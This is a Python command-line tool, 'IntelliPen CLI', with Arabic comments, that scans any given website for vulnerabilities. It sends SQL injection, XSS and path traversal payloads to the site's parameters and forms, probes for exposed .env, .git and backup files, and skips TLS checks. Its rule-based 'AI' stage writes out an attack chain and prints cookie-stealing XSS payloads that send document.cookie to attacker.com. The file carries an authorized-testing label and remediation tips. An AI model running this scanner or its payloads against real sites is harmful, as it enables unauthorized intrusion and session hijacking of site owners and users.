#!/usr/bin/env python3
"""
IntelliPen CLI - سكريبت فحص مستقل سريع
يعمل مباشرة من سطر الأوامر دون الحاجة لخادم Flask
"""

import sys
import os
import time
import requests
import re
import json
from urllib.parse import urlparse, urljoin, parse_qs, urlencode
from bs4 import BeautifulSoup
import concurrent.futures
import urllib3
urllib3.disable_warnings()

# ===== الألوان =====
R = '\033[0;31m'
G = '\033[0;32m'
Y = '\033[1;33m'
C = '\033[0;36m'
B = '\033[1m'
M = '\033[0;35m'
NC = '\033[0m'

def banner():
    print(f"""{C}
  ██╗███╗   ██╗████████╗███████╗██╗     ██╗     ██╗██████╗ ███████╗███╗   ██╗
  ██║████╗  ██║╚══██╔══╝██╔════╝██║     ██║     ██║██╔══██╗██╔════╝████╗  ██║
  ██║██╔██╗ ██║   ██║   █████╗  ██║     ██║     ██║██████╔╝█████╗  ██╔██╗ ██║
  ██║██║╚██╗██║   ██║   ██╔══╝  ██║     ██║     ██║██╔═══╝ ██╔══╝  ██║╚██╗██║
  ██║██║ ╚████║   ██║   ███████╗███████╗███████╗██║██║     ███████╗██║ ╚████║
  ╚═╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚══════╝╚══════╝╚═╝╚═╝     ╚══════╝╚═╝  ╚═══╝
{NC}{B}  AI-Powered Penetration Testing Framework v1.0 - CLI Mode{NC}
{Y}  [!] For Authorized Security Testing Only{NC}
""")

SESSION = requests.Session()
SESSION.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
})
SESSION.verify = False

TIMEOUT = 6
VULNS = []
TARGET = ""

def log(msg, level="INFO"):
    colors = {"INFO": C, "FOUND": G, "ERROR": R, "WARN": Y, "SUCCESS": G}
    c = colors.get(level, NC)
    ts = time.strftime("%H:%M:%S")
    print(f"{c}[{ts}] [{level}] {msg}{NC}")

def add_vuln(vtype, url, param, payload, evidence, severity, desc, cvss=5.0):
    VULNS.append({
        "type": vtype, "url": url, "parameter": param,
        "payload": payload, "evidence": evidence,
        "severity": severity, "description": desc, "cvss": cvss
    })
    log(f"VULN FOUND: [{severity}] {vtype} | param={param} | {url[:60]}", "FOUND")

# ===== 1. الاستطلاع =====
def recon(target):
    log(f"Starting Recon on: {target}")
    result = {"target": target, "headers": {}, "technologies": [], "forms": [], "links": [], "params_found": []}
    
    try:
        r = SESSION.get(target, timeout=TIMEOUT, allow_redirects=True)
        result["status_code"] = r.status_code
        result["final_url"] = r.url
        
        # رؤوس HTTP
        h = dict(r.headers)
        result["headers"] = h
        log(f"Server: {h.get('Server', 'Unknown')} | Status: {r.status_code}")
        
        # تقنيات
        techs = []
        if "php" in h.get("X-Powered-By", "").lower(): techs.append("PHP")
        if "asp" in h.get("X-Powered-By", "").lower(): techs.append("ASP.NET")
        if "apache" in h.get("Server", "").lower(): techs.append("Apache")
        if "nginx" in h.get("Server", "").lower(): techs.append("Nginx")
        if "iis" in h.get("Server", "").lower(): techs.append("IIS")
        if "tomcat" in h.get("Server", "").lower() or "coyote" in h.get("Server", "").lower(): techs.append("Apache Tomcat")
        
        # تحليل HTML
        soup = BeautifulSoup(r.text, "html.parser")
        
        # تقنيات من meta
        for meta in soup.find_all("meta"):
            gen = meta.get("name", "").lower()
            if "generator" in gen:
                techs.append(meta.get("content", ""))
        
        # JavaScript frameworks
        scripts = [s.get("src", "") for s in soup.find_all("script") if s.get("src")]
        for s in scripts:
            if "jquery" in s.lower(): techs.append("jQuery")
            if "angular" in s.lower(): techs.append("AngularJS")
            if "react" in s.lower(): techs.append("React")
            if "bootstrap" in s.lower(): techs.append("Bootstrap")
        
        result["technologies"] = list(set(techs))
        log(f"Technologies: {result['technologies']}")
        
        # جمع النماذج
        forms = []
        for form in soup.find_all("form"):
            form_data = {
                "action": form.get("action", ""),
                "method": form.get("method", "GET").upper(),
                "inputs": []
            }
            for inp in form.find_all(["input", "textarea", "select"]):
                form_data["inputs"].append({
                    "name": inp.get("name", ""),
                    "type": inp.get("type", "text"),
                    "value": inp.get("value", "")
                })
            forms.append(form_data)
        result["forms"] = forms
        log(f"Forms found: {len(forms)}")
        
        # جمع الروابط
        links = set()
        base_parsed = urlparse(target)
        for a in soup.find_all("a", href=True):
            href = a["href"]
            full = urljoin(target, href)
            if urlparse(full).netloc == base_parsed.netloc:
                links.add(full)
        result["links"] = list(links)
        log(f"Links found: {len(links)}")
        
        # روابط بمعاملات
        params_found = []
        for link in links:
            parsed = urlparse(link)
            if parsed.query:
                params = {k: v[0] for k, v in parse_qs(parsed.query).items()}
                params_found.append((link, params))
        result["params_found"] = params_found
        log(f"URLs with parameters: {len(params_found)}")
        
    except Exception as e:
        log(f"Recon error: {e}", "ERROR")
    
    return result

# ===== 2. فحص رؤوس الأمان =====
def check_security_headers(target, headers):
    log("Checking Security Headers...")
    required = {
        "X-Frame-Options": ("MEDIUM", "Clickjacking protection missing", 4.3),
        "X-XSS-Protection": ("LOW", "XSS filter header missing", 3.1),
        "X-Content-Type-Options": ("LOW", "MIME sniffing protection missing", 3.1),
        "Strict-Transport-Security": ("MEDIUM", "HSTS not enforced", 5.3),
        "Content-Security-Policy": ("MEDIUM", "CSP not configured", 5.3),
        "Referrer-Policy": ("LOW", "Referrer policy not set", 2.7),
    }
    for header, (sev, desc, cvss) in required.items():
        if header not in headers and header.lower() not in {k.lower() for k in headers}:
            add_vuln("Missing Security Headers", target, header, "N/A",
                     f"Header '{header}' not present in response", sev, desc, cvss)

# ===== 3. فحص SQL Injection =====
SQL_PAYLOADS = [
    ("'", "syntax error"),
    ('"', "syntax error"),
    ("' OR '1'='1", "OR"),
    ("' OR 1=1--", "OR"),
    ("1' ORDER BY 1--", "ORDER BY"),
    ("' UNION SELECT NULL--", "UNION"),
    ("' AND SLEEP(2)--", "sleep"),
    ("1; SELECT SLEEP(2)--", "sleep"),
    ("' AND 1=1--", "AND"),
    ("' AND 1=2--", "AND"),
]

SQL_ERRORS = [
    "sql syntax", "mysql_fetch", "pg_exec", "sqlite_", "ora-", "odbc driver",
    "microsoft sql", "syntax error", "unclosed quotation", "quoted string",
    "you have an error in your sql", "warning: mysql", "valid mysql result",
    "postgresql.*error", "warning.*pg_", "driver.*sql", "ole db.*sql"
]

def test_sql(url, params):
    log(f"Testing SQL Injection: {url[:60]}")
    for param_name in params:
        for payload, keyword in SQL_PAYLOADS[:5]:
            try:
                test_params = dict(params)
                test_params[param_name] = payload
                r = SESSION.get(url, params=test_params, timeout=TIMEOUT)
                body = r.text.lower()
                for err in SQL_ERRORS:
                    if re.search(err, body):
                        add_vuln("SQL Injection", url, param_name, payload,
                                 f"SQL error pattern: '{err}' found", "CRITICAL",
                                 f"SQL Injection in '{param_name}'. DB error exposed.", 9.8)
                        return  # اكتفِ بأول ثغرة لكل URL
            except:
                pass
        
        # Time-based blind
        try:
            test_params = dict(params)
            test_params[param_name] = "' AND SLEEP(3)--"
            t0 = time.time()
            SESSION.get(url, params=test_params, timeout=10)
            elapsed = time.time() - t0
            if elapsed >= 2.8:
                add_vuln("SQL Injection (Blind Time-Based)", url, param_name,
                         "' AND SLEEP(3)--", f"Response delayed {elapsed:.1f}s", "CRITICAL",
                         f"Blind Time-Based SQLi in '{param_name}'.", 9.8)
        except:
            pass

def test_sql_form(form, base_url):
    action = form.get("action", "")
    method = form.get("method", "GET").upper()
    form_url = urljoin(base_url, action) if action else base_url
    
    text_inputs = [i for i in form.get("inputs", [])
                   if i.get("name") and i.get("type") not in ["submit", "button", "hidden", "checkbox", "radio", "file"]]
    
    if not text_inputs:
        return
    
    log(f"Testing SQL Injection on form: {form_url[:60]}")
    
    for inp in text_inputs:
        for payload, keyword in SQL_PAYLOADS[:4]:
            try:
                data = {i["name"]: i.get("value", "test") for i in form["inputs"] if i.get("name")}
                data[inp["name"]] = payload
                
                if method == "POST":
                    r = SESSION.post(form_url, data=data, timeout=TIMEOUT)
                else:
                    r = SESSION.get(form_url, params=data, timeout=TIMEOUT)
                
                body = r.text.lower()
                for err in SQL_ERRORS:
                    if re.search(err, body):
                        add_vuln("SQL Injection (Form)", form_url, inp["name"], payload,
                                 f"SQL error: '{err}'", "CRITICAL",
                                 f"SQLi via form input '{inp['name']}'.", 9.8)
                        return
            except:
                pass

# ===== 4. فحص XSS =====
XSS_PAYLOADS = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert(1)>',
    '"><script>alert(1)</script>',
    "';alert(1)//",
    '<svg onload=alert(1)>',
    '"><img src=x onerror=alert(1)>',
]

XSS_DETECT = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert(1)>',
    'alert("XSS")',
    'alert(1)',
    '<svg onload=alert(1)>',
]

def test_xss(url, params):
    log(f"Testing XSS: {url[:60]}")
    for param_name in params:
        for payload in XSS_PAYLOADS[:3]:
            try:
                test_params = dict(params)
                test_params[param_name] = payload
                r = SESSION.get(url, params=test_params, timeout=TIMEOUT)
                for indicator in XSS_DETECT:
                    if indicator in r.text:
                        add_vuln("XSS (Reflected)", url, param_name, payload,
                                 f"Payload reflected: {indicator[:40]}", "HIGH",
                                 f"Reflected XSS in '{param_name}'.", 7.4)
                        return
            except:
                pass

def test_xss_form(form, base_url):
    action = form.get("action", "")
    method = form.get("method", "GET").upper()
    form_url = urljoin(base_url, action) if action else base_url
    
    text_inputs = [i for i in form.get("inputs", [])
                   if i.get("name") and i.get("type") in ["text", "search", "email", "url", "", "textarea"]]
    
    if not text_inputs:
        return
    
    log(f"Testing XSS on form: {form_url[:60]}")
    
    for inp in text_inputs[:2]:
        for payload in XSS_PAYLOADS[:3]:
            try:
                data = {i["name"]: i.get("value", "test") for i in form["inputs"] if i.get("name")}
                data[inp["name"]] = payload
                
                if method == "POST":
                    r = SESSION.post(form_url, data=data, timeout=TIMEOUT)
                else:
                    r = SESSION.get(form_url, params=data, timeout=TIMEOUT)
                
                for indicator in XSS_DETECT:
                    if indicator in r.text:
                        add_vuln("XSS (Reflected via Form)", form_url, inp["name"], payload,
                                 f"Payload reflected in form response", "HIGH",
                                 f"XSS via form '{inp['name']}'.", 7.4)
                        return
            except:
                pass

# ===== 5. فحص IDOR =====
def test_idor(links):
    log("Testing IDOR...")
    for link in links[:30]:
        parsed = urlparse(link)
        if not parsed.query:
            continue
        params = parse_qs(parsed.query)
        for param, values in params.items():
            if values and re.match(r'^\d+$', values[0]):
                try:
                    orig_val = int(values[0])
                    test_val = orig_val + 1 if orig_val > 1 else orig_val - 1
                    if test_val < 0:
                        continue
                    
                    orig_params = {k: v[0] for k, v in params.items()}
                    test_params = dict(orig_params)
                    test_params[param] = str(test_val)
                    
                    r1 = SESSION.get(link, timeout=TIMEOUT)
                    r2 = SESSION.get(parsed.scheme + "://" + parsed.netloc + parsed.path,
                                     params=test_params, timeout=TIMEOUT)
                    
                    if r2.status_code == 200 and len(r2.text) > 100 and r1.text != r2.text:
                        add_vuln("IDOR (Insecure Direct Object Reference)", link, param,
                                 str(test_val), f"Different content returned for id={test_val}",
                                 "HIGH", f"IDOR in '{param}'. Access to other records possible.", 7.5)
                except:
                    pass

# ===== 6. فحص Path Traversal =====
PATH_PAYLOADS = [
    "../../../etc/passwd", "..\\..\\..\\windows\\win.ini",
    "....//....//....//etc/passwd", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
]

PATH_INDICATORS = ["root:x:", "bin:x:", "[extensions]", "for 16-bit app support"]

def test_path_traversal(url, params):
    log(f"Testing Path Traversal: {url[:60]}")
    for param_name in params:
        for payload in PATH_PAYLOADS:
            try:
                test_params = dict(params)
                test_params[param_name] = payload
                r = SESSION.get(url, params=test_params, timeout=TIMEOUT)
                for indicator in PATH_INDICATORS:
                    if indicator in r.text:
                        add_vuln("Path Traversal", url, param_name, payload,
                                 f"File content indicator found: {indicator}", "HIGH",
                                 f"Path Traversal in '{param_name}'.", 7.5)
                        return
            except:
                pass

# ===== 7. فحص CSRF =====
def test_csrf(forms, base_url):
    log("Testing CSRF...")
    for form in forms:
        method = form.get("method", "GET").upper()
        if method != "POST":
            continue
        
        has_csrf_token = False
        for inp in form.get("inputs", []):
            name = inp.get("name", "").lower()
            if any(t in name for t in ["csrf", "token", "_token", "nonce", "authenticity"]):
                has_csrf_token = True
                break
        
        if not has_csrf_token:
            action = form.get("action", "")
            form_url = urljoin(base_url, action) if action else base_url
            add_vuln("CSRF (Missing Token)", form_url, "form",
                     "N/A", "POST form without CSRF token", "MEDIUM",
                     "Form lacks CSRF protection. Cross-site request forgery possible.", 6.5)

# ===== 8. فحص الملفات الحساسة =====
SENSITIVE_FILES = [
    "/.git/HEAD", "/.env", "/config.php", "/wp-config.php",
    "/admin/", "/administrator/", "/phpmyadmin/",
    "/robots.txt", "/sitemap.xml", "/.htaccess",
    "/backup.zip", "/backup.sql", "/db.sql",
    "/server-status", "/server-info",
    "/web.config", "/crossdomain.xml",
    "/api/v1/", "/api/v2/", "/swagger.json", "/api-docs",
]

def test_sensitive_files(base_url):
    log("Testing Sensitive File Exposure...")
    parsed = urlparse(base_url)
    base = f"{parsed.scheme}://{parsed.netloc}"
    
    def check_file(path):
        try:
            url = base + path
            r = SESSION.get(url, timeout=4, allow_redirects=False)
            if r.status_code == 200 and len(r.text) > 50:
                sev = "HIGH" if any(x in path for x in [".env", "config", "backup", ".git"]) else "MEDIUM"
                add_vuln("Sensitive File Exposure", url, "path", path,
                         f"File accessible (HTTP {r.status_code}, {len(r.text)} bytes)",
                         sev, f"Sensitive file '{path}' is accessible.", 6.5)
        except:
            pass
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=8) as ex:
        list(ex.map(check_file, SENSITIVE_FILES))
    
    return []

# ===== 9. محرك الذكاء الاصطناعي المحلي =====
def ai_analysis(target, vulns, recon_data):
    log("Running AI Exploitation Analysis...")
    
    if not vulns:
        return {
            "overall_risk_level": "LOW",
            "overall_risk_score": 2.0,
            "estimated_success_probability": "15%",
            "attack_chain": "No significant vulnerabilities found for chaining.",
            "recommendations": ["Implement security headers", "Regular security audits"],
            "priority_targets": []
        }
    
    # تحليل الثغرات
    severity_weights = {"CRITICAL": 10, "HIGH": 7, "MEDIUM": 4, "LOW": 1}
    total_score = sum(severity_weights.get(v["severity"], 1) for v in vulns)
    max_possible = len(vulns) * 10
    risk_score = min(10.0, (total_score / max(max_possible, 1)) * 10 + len(vulns) * 0.3)
    risk_score = round(risk_score, 1)
    
    if risk_score >= 8:
        risk_level = "CRITICAL"
        prob = "95%"
    elif risk_score >= 6:
        risk_level = "HIGH"
        prob = "80%"
    elif risk_score >= 4:
        risk_level = "MEDIUM"
        prob = "55%"
    else:
        risk_level = "LOW"
        prob = "25%"
    
    # بناء سلسلة الهجوم
    vuln_types = [v["type"] for v in vulns]
    chain_steps = []
    
    if any("SQL" in t for t in vuln_types):
        chain_steps.append("1. Exploit SQL Injection to extract database credentials")
        chain_steps.append("2. Use extracted credentials for admin panel access")
    
    if any("XSS" in t for t in vuln_types):
        chain_steps.append("3. Deploy XSS payload to steal session cookies")
        chain_steps.append("4. Hijack authenticated sessions via stolen cookies")
    
    if any("IDOR" in t for t in vuln_types):
        chain_steps.append("5. Exploit IDOR to access unauthorized user data")
    
    if any("Path Traversal" in t for t in vuln_types):
        chain_steps.append("6. Use Path Traversal to read sensitive server files (/etc/passwd)")
    
    if any("CSRF" in t for t in vuln_types):
        chain_steps.append("7. Craft CSRF payload to perform actions as authenticated user")
    
    if not chain_steps:
        chain_steps.append("1. Leverage information disclosure to map attack surface")
        chain_steps.append("2. Attempt credential stuffing on exposed admin interfaces")
    
    # توليد حمولات مخصصة
    custom_payloads = {}
    techs = recon_data.get("technologies", [])
    
    if any("SQL" in t for t in vuln_types):
        if "MySQL" in techs or "Apache" in techs:
            custom_payloads["SQL_MySQL"] = [
                "' UNION SELECT user(),version(),database()--",
                "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--",
                "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--"
            ]
        else:
            custom_payloads["SQL_Generic"] = [
                "' UNION SELECT NULL,NULL,NULL--",
                "' OR '1'='1'--",
                "' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--"
            ]
    
    if any("XSS" in t for t in vuln_types):
        custom_payloads["XSS_Advanced"] = [
            '<img src=x onerror="fetch(\'https://attacker.com/steal?c=\'+document.cookie)">',
            '<script>new Image().src="https://attacker.com/log?data="+btoa(document.cookie)</script>',
            '"><svg/onload=eval(atob("YWxlcnQoZG9jdW1lbnQuY29va2llKQ=="))>'
        ]
    
    # توصيات
    recommendations = []
    if any("SQL" in t for t in vuln_types):
        recommendations.append("Use parameterized queries / prepared statements")
        recommendations.append("Implement input validation and sanitization")
    if any("XSS" in t for t in vuln_types):
        recommendations.append("Implement Content Security Policy (CSP)")
        recommendations.append("Encode all user-supplied output")
    if any("CSRF" in t for t in vuln_types):
        recommendations.append("Implement CSRF tokens on all state-changing forms")
    if any("IDOR" in t for t in vuln_types):
        recommendations.append("Implement proper authorization checks on all resources")
    if any("Path Traversal" in t for t in vuln_types):
        recommendations.append("Validate and sanitize file path inputs")
        recommendations.append("Use whitelisting for allowed file paths")
    recommendations.append("Implement Web Application Firewall (WAF)")
    recommendations.append("Regular penetration testing and security audits")
    
    # أولوية الأهداف
    priority = []
    for v in sorted(vulns, key=lambda x: {"CRITICAL": 4, "HIGH": 3, "MEDIUM": 2, "LOW": 1}.get(x["severity"], 0), reverse=True)[:5]:
        priority.append({
            "type": v["type"],
            "url": v["url"],
            "parameter": v["parameter"],
            "severity": v["severity"],
            "exploit_difficulty": "Easy" if v["severity"] in ["CRITICAL", "HIGH"] else "Medium",
            "impact": "Full database access" if "SQL" in v["type"] else
                      "Session hijacking" if "XSS" in v["type"] else
                      "Unauthorized data access" if "IDOR" in v["type"] else
                      "File system access" if "Path" in v["type"] else "Security bypass"
        })
    
    return {
        "overall_risk_level": risk_level,
        "overall_risk_score": risk_score,
        "estimated_success_probability": prob,
        "attack_chain": "\n".join(chain_steps),
        "custom_payloads": custom_payloads,
        "recommendations": recommendations,
        "priority_targets": priority,
        "total_vulnerabilities": len(vulns),
        "severity_breakdown": {
            "CRITICAL": sum(1 for v in vulns if v["severity"] == "CRITICAL"),
            "HIGH": sum(1 for v in vulns if v["severity"] == "HIGH"),
            "MEDIUM": sum(1 for v in vulns if v["severity"] == "MEDIUM"),
            "LOW": sum(1 for v in vulns if v["severity"] == "LOW"),
        }
    }

# ===== 10. طباعة التقرير في الطرفية =====
def print_report(target, recon_data, ai_data, elapsed):
    print(f"\n{C}{'='*70}{NC}")
    print(f"{B}  INTELLIPEN SCAN REPORT{NC}")
    print(f"{C}{'='*70}{NC}")
    print(f"  Target   : {target}")
    print(f"  Server   : {recon_data.get('headers', {}).get('Server', 'Unknown')}")
    print(f"  Techs    : {', '.join(recon_data.get('technologies', ['Unknown']))}")
    print(f"  Duration : {elapsed:.1f}s")
    print(f"  Time     : {time.strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"{C}{'='*70}{NC}")
    
    # ملخص الثغرات
    sev = ai_data.get("severity_breakdown", {})
    total = ai_data.get("total_vulnerabilities", 0)
    print(f"\n{B}  VULNERABILITY SUMMARY{NC}")
    print(f"  Total    : {total}")
    print(f"  {R}CRITICAL : {sev.get('CRITICAL', 0)}{NC}")
    print(f"  {Y}HIGH     : {sev.get('HIGH', 0)}{NC}")
    print(f"  {M}MEDIUM   : {sev.get('MEDIUM', 0)}{NC}")
    print(f"  {C}LOW      : {sev.get('LOW', 0)}{NC}")
    
    # مستوى الخطر
    risk = ai_data.get("overall_risk_level", "LOW")
    score = ai_data.get("overall_risk_score", 0)
    prob = ai_data.get("estimated_success_probability", "0%")
    risk_color = R if risk in ["CRITICAL", "HIGH"] else Y if risk == "MEDIUM" else G
    print(f"\n{B}  AI RISK ASSESSMENT{NC}")
    print(f"  Risk Level  : {risk_color}{risk}{NC}")
    print(f"  Risk Score  : {score}/10")
    print(f"  Success Prob: {prob}")
    
    # الثغرات التفصيلية
    if VULNS:
        print(f"\n{B}  VULNERABILITIES FOUND{NC}")
        print(f"  {'-'*65}")
        for i, v in enumerate(VULNS, 1):
            sev_c = R if v["severity"] in ["CRITICAL", "HIGH"] else Y if v["severity"] == "MEDIUM" else C
            print(f"  {i:2}. {sev_c}[{v['severity']:8}]{NC} {v['type']}")
            print(f"      URL   : {v['url'][:60]}")
            print(f"      Param : {v['parameter']}")
            print(f"      CVSS  : {v['cvss']}")
            print(f"      Desc  : {v['description'][:70]}")
            print()
    
    # سلسلة الهجوم
    chain = ai_data.get("attack_chain", "")
    if chain:
        print(f"{B}  AI ATTACK CHAIN{NC}")
        for line in chain.split("\n"):
            print(f"  {G}{line}{NC}")
    
    # الأهداف ذات الأولوية
    priority = ai_data.get("priority_targets", [])
    if priority:
        print(f"\n{B}  PRIORITY TARGETS{NC}")
        for p in priority:
            print(f"  [{R}{p['severity']}{NC}] {p['type']} | {p['url'][:50]}")
            print(f"       Impact: {p['impact']} | Difficulty: {p['exploit_difficulty']}")
    
    # الحمولات المخصصة
    payloads = ai_data.get("custom_payloads", {})
    if payloads:
        print(f"\n{B}  AI-GENERATED CUSTOM PAYLOADS{NC}")
        for ptype, plist in payloads.items():
            print(f"  [{ptype}]")
            for p in plist[:3]:
                print(f"    {Y}{p}{NC}")
    
    # التوصيات
    recs = ai_data.get("recommendations", [])
    if recs:
        print(f"\n{B}  RECOMMENDATIONS{NC}")
        for r in recs[:6]:
            print(f"  [+] {r}")
    
    print(f"\n{C}{'='*70}{NC}")
    print(f"{G}  Scan complete. Report saved to intellipen_report.json{NC}")
    print(f"{C}{'='*70}{NC}\n")

# ===== الدالة الرئيسية =====
def main():
    global TARGET
    
    banner()
    
    if len(sys.argv) < 2:
        print(f"{Y}Usage: python3 intellipen_cli.py <target_url>{NC}")
        print(f"Example: python3 intellipen_cli.py http://demo.testfire.net")
        sys.exit(1)
    
    TARGET = sys.argv[1]
    if not TARGET.startswith("http"):
        TARGET = "http://" + TARGET
    
    print(f"{B}[*] Target: {TARGET}{NC}")
    print(f"{B}[*] Starting full scan...{NC}\n")
    
    start = time.time()
    
    # 1. الاستطلاع
    print(f"{C}{'='*50}{NC}")
    print(f"{B}[PHASE 1] RECONNAISSANCE{NC}")
    print(f"{C}{'='*50}{NC}")
    recon_data = recon(TARGET)
    
    # 2. فحص الثغرات
    print(f"\n{C}{'='*50}{NC}")
    print(f"{B}[PHASE 2] VULNERABILITY SCANNING{NC}")
    print(f"{C}{'='*50}{NC}")
    
    # رؤوس الأمان
    check_security_headers(TARGET, recon_data.get("headers", {}))
    
    # الملفات الحساسة
    test_sensitive_files(TARGET)
    
    # CSRF
    if recon_data.get("forms"):
        test_csrf(recon_data["forms"], TARGET)
    
    # IDOR
    if recon_data.get("links"):
        test_idor(recon_data["links"])
    
    # فحص الروابط بمعاملات
    params_found = recon_data.get("params_found", [])
    for url, params in params_found[:10]:
        test_sql(url, params)
        test_xss(url, params)
        test_path_traversal(url, params)
    
    # فحص النماذج
    for form in recon_data.get("forms", [])[:3]:
        test_sql_form(form, TARGET)
        test_xss_form(form, TARGET)
    
    # إذا لم تُكتشف معاملات، جرّب معاملات شائعة
    if not params_found and not recon_data.get("forms"):
        log("No parameters found. Testing common parameters...")
        common = {"id": "1", "page": "1", "search": "test", "q": "test"}
        test_sql(TARGET, common)
        test_xss(TARGET, common)
    
    # 3. الذكاء الاصطناعي
    print(f"\n{C}{'='*50}{NC}")
    print(f"{B}[PHASE 3] AI EXPLOITATION ANALYSIS{NC}")
    print(f"{C}{'='*50}{NC}")
    ai_data = ai_analysis(TARGET, VULNS, recon_data)
    
    elapsed = time.time() - start
    
    # 4. التقرير
    print(f"\n{C}{'='*50}{NC}")
    print(f"{B}[PHASE 4] REPORT GENERATION{NC}")
    print(f"{C}{'='*50}{NC}")
    print_report(TARGET, recon_data, ai_data, elapsed)
    
    # حفظ JSON
    report = {
        "target": TARGET,
        "scan_time": time.strftime("%Y-%m-%d %H:%M:%S"),
        "duration": f"{elapsed:.1f}s",
        "recon": {
            "server": recon_data.get("headers", {}).get("Server", "Unknown"),
            "technologies": recon_data.get("technologies", []),
            "forms_count": len(recon_data.get("forms", [])),
            "links_count": len(recon_data.get("links", [])),
        },
        "vulnerabilities": VULNS,
        "ai_analysis": ai_data
    }
    
    report_path = f"intellipen_report_{int(time.time())}.json"
    with open(report_path, "w", encoding="utf-8") as f:
        json.dump(report, f, indent=2, ensure_ascii=False)
    
    log(f"JSON report saved: {report_path}", "SUCCESS")

if __name__ == "__main__":
    main()
